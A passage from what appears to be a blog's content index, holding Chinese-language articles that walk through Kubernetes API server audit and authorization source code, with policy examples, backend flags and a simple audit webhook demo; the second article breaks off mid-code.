k8s.io/apiserver/pkg/endpoints/filters/audit.go.evaluatePolicyAndCreateAuditEvent 会评估请求的级别和规则，而 k8s.io/apiserver/pkg/audit/policy/checker.go\nfunc (p *policyRuleEvaluator) EvaluatePolicyRule(attrs authorizer.Attributes) auditinternal.RequestAuditConfigWithLevel { for _, rule := range p.Rules { // 评估则是评估用户与用户组，verb，ns,非API资源 /metrics /healthz if ruleMatches(\u0026amp;rule, attrs) { // 通过后，则将这条规则与配置返回 return auditinternal.RequestAuditConfigWithLevel{ Level: rule.Level, RequestAuditConfig: auditinternal.RequestAuditConfig{ OmitStages: rule.OmitStages, OmitManagedFields: isOmitManagedFields(\u0026amp;rule, p.OmitManagedFields), }, } } } // 如果条件都不满足，则构建一个 return auditinternal.RequestAuditConfigWithLevel{ Level: DefaultAuditLevel, RequestAuditConfig: auditinternal.RequestAuditConfig{ OmitStages: p.OmitStages, OmitManagedFields: p.OmitManagedFields, }, } } k8s.io/apiserver/pkg/audit/request.go.NewEventFromRequest 创建出审计事件对象被上面 evaluatePolicyAndCreateAuditEvent 返回\n// evaluatePolicyAndCreateAuditEvent is responsible for evaluating the audit // policy configuration applicable to the request and create a new audit // event that will be written to the API audit log. // - error if anything bad happened func evaluatePolicyAndCreateAuditEvent(req *http.Request, policy audit.PolicyRuleEvaluator) (*audit.AuditContext, error) { ctx := req.Context() attribs, err := GetAuthorizerAttributes(ctx) if err != nil { return nil, fmt.Errorf(\u0026quot;failed to GetAuthorizerAttributes: %v\u0026quot;, err) } ls := policy.EvaluatePolicyRule(attribs) audit.ObservePolicyLevel(ctx, ls.Level) if ls.Level == auditinternal.LevelNone { // Don't audit. return \u0026amp;audit.AuditContext{ RequestAuditConfig: ls.RequestAuditConfig, }, nil } requestReceivedTimestamp, ok := request.ReceivedTimestampFrom(ctx) if !ok { requestReceivedTimestamp = time.Now() } ev, err := audit.NewEventFromRequest(req, requestReceivedTimestamp, ls.Level, attribs) if err != nil { return nil, fmt.Errorf(\u0026quot;failed to complete audit event from request: %v\u0026quot;, err) } return \u0026amp;audit.AuditContext{ RequestAuditConfig: ls.RequestAuditConfig, Event: ev, }, nil } 到这里，已经清楚的了解到，Kubernetes审计工作与什么位置了，而对于Kubernetes准入给出的登录（Authentication），授权 (Authorization) 与 准入控制 (Admission control) 三个阶段来说，Audition 位于授权之后，正如下图所示，而这个真正的流程在kubernetes中有个属于叫 handler chain 整个链条中，准入与审计只是其中一部分。\n图：Kubernetes 4A 的 handler chain\n由图再结合代码可以看出，所有的客户端访问API都需要经过完整经由整个链条，而 Auditing 事件的构建是需要获取经由验证过的用户等资源构建出的事件，首次发生的为 StageRequestReceived ，这将在收到请求后执行，而由代码又可知，因为在最终结束掉整个请求时会执行 WithAudit 函数，这就为 StageResponseComplete 与 StageResponseStarted 这两个阶段被执行，而这个将发生在被注册的 handler 完成后，也就是 Admission control 后因为 AC 是在每个真实REST中被执行。TODO\n审计策略级别 [2] 审计策略级别是控制审计记录将记录那些对象的数据内容，当事件被处理时，会按照配置的审计规则进行比较。而使用该功能需要 kube-apiserver 开启参数 --audit-policy-file 指定对应的配置，如果未指定则默认不记录任何事件，可供定义的级别有四个，被定义在 k8s.io/apiserver/pkg/apis/audit/v1/types.go 中\nconst ( // LevelNone disables auditing LevelNone Level = \u0026quot;None\u0026quot; // LevelMetadata provides the basic level of auditing. LevelMetadata Level = \u0026quot;Metadata\u0026quot; // LevelRequest provides Metadata level of auditing, and additionally // logs the request object (does not apply for non-resource requests). LevelRequest Level = \u0026quot;Request\u0026quot; // LevelRequestResponse provides Request level of auditing, and additionally // logs the response object (does not apply for non-resource requests). LevelRequestResponse Level = \u0026quot;RequestResponse\u0026quot; ) None： 不记录符合该规则的事件 Metadata：只记录请求元数据（如User, timestamp, resources, verb），不记录请求和响应体。 Request：记录事件元数据和请求体，不记录响应体。 RequestResponse： 记录事件元数据，请求和响应体 下面是Kubernetes官网给出的 Policy 的配置 [2]\napiVersion: audit.k8s.io/v1 # This is required. kind: Policy # omitStages 代表忽略该阶段所有请求事件 # RequestReceived 这里配置的指在RequestReceived阶段忽略所有请求事件 omitStages: - \u0026quot;RequestReceived\u0026quot; rules: # 记录将以RequestResponse级别的格式记录pod更改 - level: RequestResponse resources: - group: \u0026quot;\u0026quot; # 这里资源的配置必须与RBAC配置的一致，pods将不支持pods/log这类子资源 resources: [\u0026quot;pods\u0026quot;] # 如果需要配置子资源按照下列方式 - level: Metadata resources: - group: \u0026quot;\u0026quot; resources: [\u0026quot;pods/log\u0026quot;, \u0026quot;pods/status\u0026quot;] # 不记录的资源为controller-leader的configmaps资源的请求 - level: None resources: - group: \u0026quot;\u0026quot; resources: [\u0026quot;configmaps\u0026quot;] resourceNames: [\u0026quot;controller-leader\u0026quot;] # 不记录用户为 \u0026quot;system:kube-proxy\u0026quot; 发起的对 endpoints与services资源的watch请求事件 - level: None users: [\u0026quot;system:kube-proxy\u0026quot;] verbs: [\u0026quot;watch\u0026quot;] resources: - group: \u0026quot;\u0026quot; # core API group resources: [\u0026quot;endpoints\u0026quot;, \u0026quot;services\u0026quot;] # 每个登录成功的用户，都会被追加一个用户组为 \u0026quot;system:authenticated\u0026quot; # 下述规则为不记录包含非资源类型的URL的已认证请求 - level: None userGroups: [\u0026quot;system:authenticated\u0026quot;] nonResourceURLs: - \u0026quot;/api*\u0026quot; # Wildcard matching. - \u0026quot;/version\u0026quot; # 记录kube-system名称空间configmap更改事件的请求体与元数据 - level: Request resources: - group: \u0026quot;\u0026quot; # core API group resources: [\u0026quot;configmaps\u0026quot;] # This rule only applies to resources in the \u0026quot;kube-system\u0026quot; namespace. # The empty string \u0026quot;\u0026quot; can be used to select non-namespaced resources. namespaces: [\u0026quot;kube-system\u0026quot;] # 事件将记录所有名称空间内对于configmap与secret资源改变的元数据 - level: Metadata resources: - group: \u0026quot;\u0026quot; # core API group resources: [\u0026quot;secrets\u0026quot;, \u0026quot;configmaps\u0026quot;] # 记录对group为core与extensions下的资源类型请求的 请求体与元数据（request级别） - level: Request resources: - group: \u0026quot;\u0026quot; # core API group - group: \u0026quot;extensions\u0026quot; # Version of group should NOT be included. # 这种属于泛规则，会记录所有上述其他之外的所有类型请求的元数据 # 类似于授权，小权限在前，* 最后 - level: Metadata # Long-running requests like watches that fall under this rule will not # generate an audit event in RequestReceived. omitStages: - \u0026quot;RequestReceived\u0026quot; Backend [3] kubernetes目前为Auditing 提供了两个后端，日志方式与webhook方式，kubernetes审计事件会遵循 audit.k8s.io 结构写入到后端。\n日志模式配置 启用日志模式只需要配置几个参数 [4]\n--audit-log-path 写入审计事件的日志路径。这个是必须配置的否则默认输出到STDOUT --audit-log-maxage 审计日志文件保留的最大天数 --audit-log-maxbackup 审计日志保留的的最大数量 --audit-log-maxsize 审计日志文件最大大小（单位M）大于会切割 例如配置\n--audit-policy-file=/etc/kubernetes/audit-policy.yaml \\ --audit-log-path=/var/log/kubernetes/audit.log \\ --audit-log-maxsize=20M webhook [5] webhook是指审计事件将由 kube-apiserver 发送到webhook服务中记录，开启webhook只需要配置 --audit-webhook-config-file 与 --audit-policy-file 两个参数，而其他的则是对该模式的辅助\n--audit-webhook-config-file ：webhook的配置文件，格式是kubeconfig类型，所有的信息不是kubernetes api配置，而是webhook相关信息\n--audit-webhook-initial-backoff ：第一次失败后重试事件，随后仍失败后将以指数方式退避重试\n--audit-webhook-mode ：发送至webhook的模式。 batch, blocking, blocking-strict 。\n例如配置\n--audit-policy-file=/etc/kubernetes/audit-policy.yaml \\ --audit-webhook-config-file=/etc/kubernetes/auth/audit-webhook.yaml \\ --audit-webhook-mode=batch \\ 对于initialBackoff 的退避重试则如代码所示 k8s.io/apiserver/pkg/server/options/audit.go\nfunc (o *AuditWebhookOptions) newUntruncatedBackend(customDial utilnet.DialFunc) (audit.Backend, error) { groupVersion, _ := schema.ParseGroupVersion(o.GroupVersionString) webhook, err := pluginwebhook.NewBackend(o.ConfigFile, groupVersion, webhook.DefaultRetryBackoffWithInitialDelay(o.InitialBackoff), customDial) if err != nil { return nil, fmt.Errorf(\u0026quot;initializing audit webhook: %v\u0026quot;, err) } webhook = o.BatchOptions.wrapBackend(webhook) return webhook, nil } 在函数 k8s.io/apiserver/pkg/util/webhook/webhook.go.DefaultRetryBackoffWithInitialDelay 中看到 通过 wait.Backoff 进行的\nreturn wait.Backoff{ // 时间间隔，用于调用 Step 方法时返回的时间间隔 Duration: initialBackoffDelay, // 用于计算下次的时间间隔，不能为负数 // Factor 大于 0 时，Backoff 在计算下次的时间间隔时都会根据 // Duration * Factor，Factor * Duration 不能大于 Cap Factor: 1.5, // 抖动，Jitter \u0026gt; 0 时，每次迭代的时间间隔都会额外加上 0 - Duration * Jitter 的随机时间, // 并且抖动出的时间不会设置为 Duration，而且不受 Caps 的限制 Jitter: 0.2, // 进行指数回退(*Factor) 操作的次数 // 当 Factor * Duration \u0026gt; Cap 时 Steps 会被设置为 0, Duration 设置为 Cap // 也就是说后续的迭代时间间隔都会返回 Duration Steps: 5, // 还有一个cap（Cap time.Duration），是最大的时间间隔 } 批处理 日志后端与webhook后端都支持批处理模式，默认值为webhook默认开启batch，而log则被禁用\n--audit-log-mode/--audit-webhook-mode ：参数通过将webhook替换为log则为对应的 batch 模式的参数，可以通过 kube-apiserver --help|grep \u0026quot;audit\u0026quot;|grep batch 查看 batch 默认值，缓冲事件进行异步批量处理 --audit-webhook-batch-buffer-size：批处理之前要缓冲的事件数。如果传入事件的溢出，则被丢弃。 --audit-webhook-batch-max-size：定义每一批中的最大事件数 --audit-webhook-batch-max-wait：批处理队列未满时等待的事件，到时强制写入一次 --audit-webhook-batch-throttle-qps：定义每秒最大平均批次 --audit-webhook-batch-throttle-burst：如果之前还没使用throttle-qps之前，发送的最大批数，通常情况下为第一次启动时生效的参数 blocking 阻止 apiserver 处理每个单独事件 blocking-strict：与 blocking 相同，但当 RequestReceived 阶段的审计日志记录失败时，对 kube-apiserver 的整个请求都将失败 参数调整 适当的调整参数与策略可以有效适应 kuber-apiserver 的负载，如在记录日志时应只记录所需的事件，而不是所有的事件，这样可以避免 APIServer不必要开销，例如：\n每个请求存在多个阶段，而审计时其实不关心响应等信息，可以只记录 RequestReceived 的 metadata 级别。 \u0026ldquo;pods/log\u0026rdquo;, \u0026ldquo;pods/status\u0026rdquo; 在记录时应该区分子资源类型，而不要直接写 pods 或 pods/* kubernetes系统组件内的事件如果没有特殊要求可以不记录 对于资源类型，如configmap的请求其实没必要记录 审计记录应严格按照外部用户记录，而不是所有请求 如何适配APIServer的负载能力，正如官方给的示例一样，如果 kube-apiserver 每秒收到100个请求，而记录事件为 ResponseStarted 和ResponseComplete 阶段，此时会记录的条数约 200/s ，如果batch缓冲区为100，那么需要配置的参数至少2Qps/s。再假设后端处理能力为5秒，那么缓冲区需要配置的大小至少为5秒的事件，即1000条evnet，10个batch。正如下图所示：\n图：审计批处理参数调优结构图 Source：https://www.cnblogs.com/zhangmingcheng/p/16539514.html\n而kube-apiserver提供了两个Prometheus指标可以用于监控审计子系统的状态\napiserver_audit_event_total 审计事件的总数 apiserver_audit_error_total 由于错误而被丢弃的审计事件总数，例如panic类型事件 实验：Audit Webhook 编写一个webhook，用于处理接收到的日志，这里直接打印\nfunc serveAudit(w http.ResponseWriter, r *http.Request) { b, err := ioutil.ReadAll(r.Body) if err != nil { httpError(w, err) return } var eventList audit.EventList err = json.Unmarshal(b, \u0026amp;eventList) if err != nil { klog.V(3).Info(\u0026quot;Json convert err: \u0026quot;, err) httpError(w, err) return } for _, event := range eventList.Items { // here is your logic fmt.Printf(\u0026quot;审计ID %s: 用户\u0026lt;%s\u0026gt;, 请求对象\u0026lt;%s\u0026gt;, 操作\u0026lt;%s\u0026gt;, 请求阶段\u0026lt;%s\u0026gt;\\n\u0026quot;, event.AuditID, event.User.UID, event.RequestURI, event.Verb, event.Stage, ) } w.WriteHeader(http.StatusOK) } 当使用命令执行查看Pod的操作时，会看到webhook收到的下述审计日志\n操作命令\nfor n in `seq 1 100`; do kubectl get pod --user=admin; done 审计日志\n审计ID c0313416-f950-4361-9823-7c4792b143fd: 用户\u0026lt;admin\u0026gt;, 请求对象\u0026lt;/api/v1/namespaces/default/pods?limit=500\u0026gt;, 操作\u0026lt;list \u0026gt;, 请求阶段\u0026lt;ResponseComplete\u0026gt; 审计ID db2390c1-83cf-42e7-b589-70cd04003d0e: 用户\u0026lt;admin\u0026gt;, 请求对象\u0026lt;/api/v1/namespaces/default/pods?limit=500\u0026gt;, 操作\u0026lt;list \u0026gt;, 请求阶段\u0026lt;ResponseComplete\u0026gt; 审计ID a8fc2ff9-d0c5-4263-901c-b5974fd58026: 用户\u0026lt;admin\u0026gt;, 请求对象\u0026lt;/api/v1/namespaces/default/pods?limit=500\u0026gt;, 操作\u0026lt;list \u0026gt;, 请求阶段\u0026lt;ResponseComplete\u0026gt; 总结 kubernetes通过插件的方式提供了提供了一个IT系统 4A模型为集群提供了安全保障，与传统的4A (Authentication, Authorization, Accounting, Auditing) 不同的是，对于 Accounting 与 Authentication 在kubernetes中设计来说 Kubernetes没有用户的实现而是一个抽象，这使得Kubernetes可以更灵活使用任意的用户系统完成登录（OID, X.509, webhook, proxy, SA\u0026hellip;.），而对于授权来说，Kubernetes 通过多种授权模型(RBAC, ABAC, Node, Webhook)，为集群提供了灵活的权限；而不同的是，通过 Admission Control 可以为集群提供更多的安全策略，例如镜像策略，通过三方提供的控制器来自定义更多的安全策略，如OPA。而这种设计为Kubernetes集群提供了一种更灵活的安全。\nReference [1] Auditing\n[2] Audit policy\n[3] Audit backends\n[4] Log backend\n[5] Webhook backend\n[6] Event batching\n[7] Parameter tuning\n[8] Privilege Management Infrastructure\n[9] Kubernetes 审计（Auditing）功能详解\n[10] kubernetes 审计日志功能\n","permalink":"https://www.oomkill.com/2022/11/ch34-auditing/","summary":"","title":"深入理解Kubernetes 4A - Audit源码解析"},{"content":"Overview 在 Kubernetes 中，当一个访问请求通过了登录阶段（Authentication），必须还需要请求拥有该对象的访问权限，而授权部分也是Kubernetes API 访问控制中的第二个部分 Authorization .\nAuthorization 在 Kubernetes中是以评估发起请求的用户，根据其身份特性评估这次请求是被 ”拒绝“ 还是 “允许”，同访问控制三部曲中其他两个插件 (Authentication, Adminssion Control) 一样，Authorization 也可以同时配置多个，当收到用户的请求时，会依次检查这个阶段配置的所有模块，如果任何一个模块对该请求授予权限（拒绝或允许），那么该阶段会直接返回，当所有模块都没有该用户所属的权限时，默认是拒绝，在Kubernetes中，被该插件拒绝的用户显示为HTTP 403。\n如有错别字或理解错误地方请多多担待，代码是以1.24进行整理，实验是以1.19环境进行，差别不大\nobjective：\n了解kubernetes Authorization机制 了解授权系统的设计 完成实验，使用 OPA 作为 Kubernetes 外部用户，权限认证模型 RBAC 的替代品 Kubernetes是如何对用户授权的 kubernetes对用户授权需要遵守的shema必须拥有下列属性，代码位于pkg\\apis\\authorization\\types.go\ntype SubjectAccessReview struct { // API必须实现的部分 metav1.TypeMeta metav1.ObjectMeta // 请求需要遵守的属性 Spec SubjectAccessReviewSpec // 请求被授权的状态 Status SubjectAccessReviewStatus } 这里可以看到数据模型是\ntype SubjectAccessReviewSpec struct { // ResourceAttributes describes information for a resource access request ResourceAttributes *ResourceAttributes // NonResourceAttributes describes information for a non-resource access request NonResourceAttributes *NonResourceAttributes // 请求的用户，必填 // 如果只传递 User，而没有Group，那么权限必须与用户对应，例如rolebinding/clusterrolebing // 如果传递了User与Group，那么rolebinding/clusterrolebing权限最大为Group，最小为User User string // Groups是用户所属组，可以有多个 Groups []string // Extra corresponds to the user.Info.GetExtra() method from the authenticator. Since that is input to the authorizer // 这里通常对于验证和授权阶段，没有特别的需求 Extra map[string]ExtraValue // UID 请求用户的UID，通常来说与User相同，Authentication中也是这么做的 UID string } 由此可得知，在授权部分，kubernetes要求请求必须存在\n用户类属性：user，group ，extra 由 Authentication 提供的用户信息 请求类属性： API资源： curl $API_SERVER_URL/api/v1/namespaces 请求路径： 非API资源格式的路径，/api，/healthz verb：HTTP请求方法，GET，POST.. 资源类属性： 访问的资源的名称或ID，如Pod名 要访问的名称空间 资源所属组，Kubernetes资源有GVR组成 那么，SubjectAccessReview.Spec 为要审查的对象，SubjectAccessReview.Status 为审查结果，通常在每个请求到来时，入库前必定被审查\nKubernetes中的授权模式 知道授权的对象，就需要知道如何对该对象进行授权，Kubernetes authorizer 提供了下列授权模式\npkg/kubeapiserver/authorizer/modes/modes.go\nconst ( // ModeAlwaysAllow is the mode to set all requests as authorized ModeAlwaysAllow string = \u0026quot;AlwaysAllow\u0026quot; // ModeAlwaysDeny is the mode to set no requests as authorized ModeAlwaysDeny string = \u0026quot;AlwaysDeny\u0026quot; // ModeABAC is the mode to use Attribute Based Access Control to authorize ModeABAC string = \u0026quot;ABAC\u0026quot; // ModeWebhook is the mode to make an external webhook call to authorize ModeWebhook string = \u0026quot;Webhook\u0026quot; // ModeRBAC is the mode to use Role Based Access Control to authorize ModeRBAC string = \u0026quot;RBAC\u0026quot; // ModeNode is an authorization mode that authorizes API requests made by kubelets. ModeNode string = \u0026quot;Node\u0026quot; ) 可以看出，大致遵循模式进行授权\nModeABAC (Attribute-based access control)：是一种将属性分组，而后属性组分配给用户的模型，通常情况下这种模型很少使用 ModeRBAC (Role Based Access Control) ：是kubernetes主流的授权模型，是将用户分组，将属性分配给用户组的一种模型 ModeNode：对kubelet授权的方式 ModeWebhook：用户注入给Kubernetes 授权插件进行回调的一种授权模式 Kubernetes 授权生命周期 在启动 kube-apiserver 是都会初始化被注入一个 Authorizer 而这个被上面模式进行实现，如 RBACAuthorizer , WebhookAuthorizer k8s.io/apiserver/pkg/authorization/authorizer/interfaces.go\ntype Authorizer interface { Authorize(ctx context.Context, a Attributes) (authorized Decision, reason string, err error) } 在 Run 中会创建一个CreateServerChain，这里面可以看到对应注册进来的 Authorizer k8s.io\\kubernetes\\cmd\\kube-apiserver\\app\\server.go\n// Run runs the specified APIServer. This should never exit. func Run(completeOptions completedServerRunOptions, stopCh \u0026lt;-chan struct{}) error { // To help debugging, immediately log version klog.Infof(\u0026quot;Version: %+v\u0026quot;, version.Get()) klog.InfoS(\u0026quot;Golang settings\u0026quot;, \u0026quot;GOGC\u0026quot;, os.Getenv(\u0026quot;GOGC\u0026quot;), \u0026quot;GOMAXPROCS\u0026quot;, os.Getenv(\u0026quot;GOMAXPROCS\u0026quot;), \u0026quot;GOTRACEBACK\u0026quot;, os.Getenv(\u0026quot;GOTRACEBACK\u0026quot;)) server, err := CreateServerChain(completeOptions) if err != nil { return err } prepared, err := server.PrepareRun() if err != nil { return err } return prepared.Run(stopCh) } 可以看到在创建这个 Authorizer 时会调用一个 BuildAuthorizer 构建这个 Authorizer k8s.io/kubernetes/cmd/kube-apiserver/app/server.go\nfunc buildGenericConfig( s *options.ServerRunOptions, proxyTransport *http.Transport, ) ( genericConfig *genericapiserver.Config, versionedInformers clientgoinformers.SharedInformerFactory, serviceResolver aggregatorapiserver.ServiceResolver, pluginInitializers []admission.PluginInitializer, admissionPostStartHook genericapiserver.PostStartHookFunc, storageFactory *serverstorage.DefaultStorageFactory, lastErr error, ) { ... genericConfig.Authorization.Authorizer, genericConfig.RuleResolver, err = BuildAuthorizer(s, genericConfig.EgressSelector, versionedInformers) if err != nil { lastErr = fmt.Errorf(\u0026quot;invalid authorization config: %v\u0026quot;, err) return } ... } 在代码 BuildAuthorizer 中构建了这个 Authorizer 其中可以看到 s 为 kube-apiserver 对于授权阶段的参数，例如参数，使用哪些模式 --authorization-mode，使用的webhook的配置 --authentication-token-webhook-config-file 等，通过传入的参数来决定这些\n// BuildAuthorizer constructs the authorizer func BuildAuthorizer(s *options.ServerRunOptions, EgressSelector *egressselector.EgressSelector, versionedInformers clientgoinformers.SharedInformerFactory) (authorizer.Authorizer, authorizer.RuleResolver, error) { // 这里构建出 authorizer.Config authorizationConfig := s.Authorization.ToAuthorizationConfig(versionedInformers) if EgressSelector != nil { egressDialer, err := EgressSelector.Lookup(egressselector.ControlPlane.AsNetworkContext()) if err != nil { return nil, nil, err } authorizationConfig.CustomDial = egressDialer } // 然后返回你开启的每一个webhook的模式的 authorizer return authorizationConfig.New() } 而对应这部分的数据结构如下所示 k8s.io/pkg/kubeapiserver/options/authorization.go\n// BuiltInAuthorizationOptions contains all build-in authorization options for API Server type BuiltInAuthorizationOptions struct { Modes []string PolicyFile string WebhookConfigFile string WebhookVersion string WebhookCacheAuthorizedTTL time.Duration WebhookCacheUnauthorizedTTL time.Duration // WebhookRetryBackoff specifies the backoff parameters for the authorization webhook retry logic. // This allows us to configure the sleep time at each iteration and the maximum number of retries allowed // before we fail the webhook call in order to limit the fan out that ensues when the system is degraded. WebhookRetryBackoff *wait.Backoff } 例如在客户端部分，如果需要授权，都会使用该操作，可以在代码 k8s.io/pkg/registry/authorization/subjectaccessreview/rest.go 中可以看到REST中会 authorizer.Authorize 去验证是否有权限操作\nfunc (r *REST) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) { subjectAccessReview, ok := obj.(*authorizationapi.SubjectAccessReview) if !ok { return nil, apierrors.NewBadRequest(fmt.Sprintf(\u0026quot;not a SubjectAccessReview: %#v\u0026quot;, obj)) } if errs := authorizationvalidation.ValidateSubjectAccessReview(subjectAccessReview); len(errs) \u0026gt; 0 { return nil, apierrors.NewInvalid(authorizationapi.Kind(subjectAccessReview.Kind), \u0026quot;\u0026quot;, errs) } if createValidation != nil { if err := createValidation(ctx, obj.DeepCopyObject()); err != nil { return nil, err } } authorizationAttributes := authorizationutil.AuthorizationAttributesFrom(subjectAccessReview.Spec) decision, reason, evaluationErr := r.authorizer.Authorize(ctx, authorizationAttributes) subjectAccessReview.Status = authorizationapi.SubjectAccessReviewStatus{ Allowed: (decision == authorizer.DecisionAllow), Denied: (decision == authorizer.DecisionDeny), Reason: reason, } if evaluationErr != nil { subjectAccessReview.Status.EvaluationError = evaluationErr.Error() } return subjectAccessReview, nil } authorizer.Authorize 会被实现在每一个该阶段的模式下，在 withAuthentication 构建了一个授权的 http.Handler 函数\nk8s.io/apiserver/pkg/endpoints/filters/authorization.go\nfunc WithAuthorization(handler http.Handler, a authorizer.Authorizer, s runtime.NegotiatedSerializer) http.Handler { if a == nil { klog.Warning(\u0026quot;Authorization is disabled\u0026quot;) return handler } return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) { ctx := req.Context() attributes, err := GetAuthorizerAttributes(ctx) if err != nil { responsewriters.InternalError(w, req, err) return } // 这里调用了authorizer.Authorizer传入的authorizer来进行鉴权 authorized, reason, err := a.Authorize(ctx, attributes) // an authorizer like RBAC could encounter evaluation errors and still allow the request, so authorizer decision is checked before error here. if authorized == authorizer.DecisionAllow { audit.AddAuditAnnotations(ctx, decisionAnnotationKey, decisionAllow, reasonAnnotationKey, reason) handler.ServeHTTP(w, req) return } if err != nil { audit.AddAuditAnnotation(ctx, reasonAnnotationKey, reasonError) responsewriters.InternalError(w, req, err) return } klog.V(4).InfoS(\u0026quot;Forbidden\u0026quot;, \u0026quot;URI\u0026quot;, req.RequestURI, \u0026quot;Reason\u0026quot;, reason) audit.AddAuditAnnotations(ctx, decisionAnnotationKey, decisionForbid, reasonAnnotationKey, reason) responsewriters.Forbidden(ctx, attributes, w, req, reason, s) }) } 接下来在 createAggregatorConfig 调用了 BuildHandlerChainWithStorageVersionPrecondition 而又调用了\ncmd/kube-apiserver/app/aggregator.go\nfunc createAggregatorConfig( kubeAPIServerConfig genericapiserver.Config, commandOptions *options.ServerRunOptions, externalInformers kubeexternalinformers.SharedInformerFactory, serviceResolver aggregatorapiserver.ServiceResolver, proxyTransport *http.Transport, pluginInitializers []admission.PluginInitializer, ) (*aggregatorapiserver.Config, error) { // make a shallow copy to let us twiddle a few things // most of the config actually remains the same. We only need to mess with a couple items related to the particulars of the aggregator genericConfig := kubeAPIServerConfig genericConfig.PostStartHooks = map[string]genericapiserver.PostStartHookConfigEntry{} genericConfig.RESTOptionsGetter = nil // prevent generic API server from installing the OpenAPI handler. Aggregator server // has its own customized OpenAPI handler. genericConfig.SkipOpenAPIInstallation = true if utilfeature.DefaultFeatureGate.Enabled(genericfeatures.StorageVersionAPI) \u0026amp;\u0026amp; utilfeature.DefaultFeatureGate.Enabled(genericfeatures.APIServerIdentity) { // Add StorageVersionPrecondition handler to aggregator-apiserver. // The handler will block write requests to built-in resources until the // target resources' storage versions are up-to-date. genericConfig.BuildHandlerChainFunc = genericapiserver.BuildHandlerChainWithStorageVersionPrecondition } 而 k8s.io/apiserver/pkg/server/config.go 返回这个函数 BuildHandlerChainWithStorageVersionPrecondition\nhandlerChainBuilder := func(handler http.Handler) http.Handler { return c.BuildHandlerChainFunc(handler, c.Config) } apiServerHandler := NewAPIServerHandler(name, c.Serializer, handlerChainBuilder, delegationTarget.UnprotectedHandler()) s := \u0026amp;GenericAPIServer{ discoveryAddresses: c.DiscoveryAddresses, LoopbackClientConfig: c.LoopbackClientConfig, legacyAPIGroupPrefixes: c.LegacyAPIGroupPrefixes, admissionControl: c.AdmissionControl, Serializer: c.Serializer, AuditBackend: c.AuditBackend, Authorizer: c.Authorization.Authorizer, delegationTarget: delegationTarget, EquivalentResourceRegistry: c.EquivalentResourceRegistry, HandlerChainWaitGroup: c.HandlerChainWaitGroup, Handler: apiServerHandler, listedPathProvider: apiServerHandler, 只要知道哪里调用了 handlerChainBuilder 就知道了鉴权步骤在哪里了，可以看到 handlerChainBuilder 被传入了 apiServerHandler，而后被作为参数返回给 listedPathProvider: \u0026amp;GenericAPIServer{}\nlistedPathProvider在 k8s.io/apiserver/pkg/server/genericapiserver.go\nfunc (s *GenericAPIServer) ListedPaths() []string { return s.listedPathProvider.ListedPaths() } ListedPaths() 又在代码 k8s.io/apiserver/pkg/server/routes/index.go 中被 构建成这个http服务\n// ListedPaths returns the paths that should be shown under / func (a *APIServerHandler) ListedPaths() []string { var handledPaths []string // Extract the paths handled using restful.WebService for _, ws := range a.GoRestfulContainer.RegisteredWebServices() { handledPaths = append(handledPaths, ws.RootPath()) } handledPaths = append(handledPaths, a.NonGoRestfulMux.ListedPaths()...) sort.Strings(handledPaths) return handledPaths } // ServeHTTP serves the available paths. func (i IndexLister) ServeHTTP(w http.ResponseWriter, r *http.Request) { responsewriters.WriteRawJSON(i.StatusCode, metav1.RootPaths{Paths: i.PathProvider.ListedPaths()}, w) } 至此，可以知道，每次请求时，我们在配置 kube-apiserver 配置的授权插件 .authorizer.Authorize ，而这个参数会被带至 subjectAccessReview 向下传递，其中 User,Group,Extra,UID 为 authentication 部分提供\nAuthorization webhook Authorization webhook 位于 k8s.io/apiserver/plugin/pkg/authorizer/webhook/webhook.go，是通过 kube-apiserver 注入进来的配置，就是上面讲到的如果提供了配置就会加入这种类型的 Authorization 插件来认证。当配置此类型的授权插件，Authorize 会被调用，通过向注入的 URL 发起 REST 请求进行授权，请求对象是 v1beta1.SubjectAccessReview\n下面是请求的实例\n{ \u0026quot;apiVersion\u0026quot;: \u0026quot;authorization.k8s.io/v1beta1\u0026quot;, \u0026quot;kind\u0026quot;: \u0026quot;SubjectAccessReview\u0026quot;, \u0026quot;spec\u0026quot;: { \u0026quot;resourceAttributes\u0026quot;: { \u0026quot;namespace\u0026quot;: \u0026quot;kittensandponies\u0026quot;, \u0026quot;verb\u0026quot;: \u0026quot;GET\u0026quot;, \u0026quot;group\u0026quot;: \u0026quot;group3\u0026quot;, \u0026quot;resource\u0026quot;: \u0026quot;pods\u0026quot; }, \u0026quot;user\u0026quot;: \u0026quot;jane\u0026quot;, \u0026quot;group\u0026quot;: [ \u0026quot;group1\u0026quot;, \u0026quot;group2\u0026quot; ] } } webhook 返回的格式\n// 如果允许这个用户访问则返回这个格式 { \u0026quot;apiVersion\u0026quot;: \u0026quot;authorization.k8s.io/v1beta1\u0026quot;, \u0026quot;kind\u0026quot;: \u0026quot;SubjectAccessReview\u0026quot;, \u0026quot;status\u0026quot;: { \u0026quot;allowed\u0026quot;: true } } // 如果拒绝这个用户访问则返回这个格式 { \u0026quot;apiVersion\u0026quot;: \u0026quot;authorization.k8s.io/v1beta1\u0026quot;, \u0026quot;kind\u0026quot;: \u0026quot;SubjectAccessReview\u0026quot;, \u0026quot;status\u0026quot;: { \u0026quot;allowed\u0026quot;: false, \u0026quot;reason\u0026quot;: \u0026quot;user does not have read access to the namespace\u0026quot; } } 对于webhook来讲，只要接受请求保持上面格式，而返回格式为下属格式，就可以很好的将Kubernetes 权限体系接入到三方系统中，例如 open policy agent。\n同样 webhook 也提供了 Authorize 函数，如同上面一样会被注入到每个handler中被执行\nfunc (w *WebhookAuthorizer) Authorize(ctx context.Context, attr authorizer.Attributes) (decision authorizer.Decision, reason string, err error) { r := \u0026amp;authorizationv1.SubjectAccessReview{} if user := attr.GetUser(); user != nil { r.Spec = authorizationv1.SubjectAccessReviewSpec{ User: user.GetName(), UID: user.GetUID(), Groups: user.GetGroups(), Extra: convertToSARExtra(user.GetExtra()), } } if attr.IsResourceRequest() { r.Spec.ResourceAttributes = \u0026amp;authorizationv1.ResourceAttributes{ Namespace: attr.GetNamespace(), Verb: attr.GetVerb(), Group: attr.GetAPIGroup(), Version: attr.GetAPIVersion(), Resource: attr.GetResource(), Subresource: attr.GetSubresource(), Name: attr.GetName(), } } else { r.Spec.NonResourceAttributes = \u0026amp;authorizationv1.NonResourceAttributes{ Path: attr.GetPath(), Verb: attr.GetVerb(), } } key, err := json.Marshal(r.Spec) if err != nil { return w.decisionOnError, \u0026quot;\u0026quot;, err } if entry, ok := w.responseCache.Get(string(key)); ok { r.Status = entry.(authorizationv1.SubjectAccessReviewStatus) } else { var result 